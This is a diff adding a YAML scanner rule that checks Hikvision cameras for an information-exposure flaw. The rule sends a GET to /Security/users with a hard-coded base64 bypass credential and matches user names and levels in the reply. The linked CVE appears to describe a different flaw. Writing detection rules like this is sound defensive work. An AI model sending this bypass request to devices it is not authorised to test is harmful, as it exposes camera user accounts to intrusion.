@@ -1,0 +1,10 @@
+name: hikvision-cam-info-exposure
+rules:
+  - method: GET
+    path: "/Security/users?auth=YWRtaW46MTEK"
+    expression: |
+      response.status == 200 && response.content_type.contains("application/xml") && response.body.bcontains(b"userName") && response.body.bcontains(b"userLevel")
+detail:
+  author: AbdulrahmanTamim
+  links:
+    - https://www.cve.org/CVERecord?id=CVE-2021-36260
